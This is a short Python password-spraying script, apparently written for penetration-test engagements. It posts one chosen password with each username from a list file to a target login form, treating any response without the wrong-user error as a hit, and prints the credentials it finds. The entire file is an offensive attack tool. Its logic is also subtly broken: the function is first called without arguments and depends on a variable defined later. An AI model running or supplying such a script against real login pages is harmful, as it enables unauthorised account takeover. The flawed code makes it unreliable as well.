import requests

targeturl = input("Enter Target Url: ")
targetpass = input("Enter Target Password: ")
error = input("Enter Wrong User Error Message: ")

def passwordSpray(targetpass,targeturl,error):
    for username in usernames:
        username = username.strip()
        print(f"Trying:", {username})
        data_dict = {"username": username,"password": targetpass,"login":"submit"}
        response = requests.post(targeturl, data=data_dict)
        if error in str(response.content):
           pass
        elif "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            exit(0)
        else:
            print(f"Username: ---> ", {username})
            print(f"Password: ---> ", {targetpass})
            exit(0)

if __name__ == '__main__':
    try:
        passwordSpray()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")

    #compile list from engagement notes
    with open("usernames.txt", "r") as usernames:
        passwordSpray(targetpass,targeturl,error)

    print("[!!] Username not in list")